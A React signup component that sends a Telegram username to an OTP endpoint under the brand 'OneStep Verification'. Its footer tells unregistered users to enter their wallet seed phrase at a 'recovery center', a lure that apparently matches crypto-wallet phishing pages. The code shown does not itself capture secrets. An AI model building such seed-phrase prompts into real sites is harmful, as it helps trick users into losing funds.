import { useState } from "react";
import { useNavigate } from "react-router-dom";
import api from "../services/api";
import { useAuth } from "../contexts/AuthContext";
import "../assets/css/Signup.css";
import { toast } from "react-toastify";

function Signup() {
  const { setTelegramId } = useAuth();
  const [telegramInput, setTelegramInput] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSendOtp = async () => {
    if (!telegramInput) return toast.error("Please enter your Telegram username.");

    try {
      setLoading(true);
      await api.post("/send-otp", {
        telegram_id: telegramInput,
      });

      toast.success(`OTP sent to Telegram`);
      setTelegramId(telegramInput);
      navigate("/otp");
    } catch (error) {
      const errorMsg =
        error.response?.data?.message || error.message || "Something went wrong";
        toast.error(errorMsg);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="signup-page">
      <div className="back-link" onClick={() => navigate("/login")}>
        ← Back to Login
      </div>

      <div className="signup-card">
        <h1 className="signup-title">Sign up</h1>
        <p className="signup-subtitle">Complete OneStep Verification</p>

        <p className="signup-prompt">Kindly select a messenger</p>

        <div className="messenger-icon" onClick={handleSendOtp}>
          <img src="/telegram-icon.png" alt="Telegram" />
        </div>

        <input
          className="telegram-input"
          type="text"
          placeholder="@yourtelegram"
          value={telegramInput}
          onChange={(e) => setTelegramInput(e.target.value)}
        />

        <button className="signup-button" onClick={handleSendOtp} disabled={loading}>
          {loading ? "Sending..." : "Send OTP"}
        </button>

        <p className="help-text">Having trouble using OneStep Verification?</p>

        <button className="help-button">HELP CENTRE</button>

        <p className="signup-footer">
          If you have not yet registered for OneStep, go to the recovery center to use the Seed phrase recovery with your seed phrase to gain access to your account.
        </p>

        <p className="terms-text">
          By using Login you agree to our <a href="#">Terms & Privacy Policy</a>.
        </p>
      </div>
    </div>
  );
}

export default Signup;
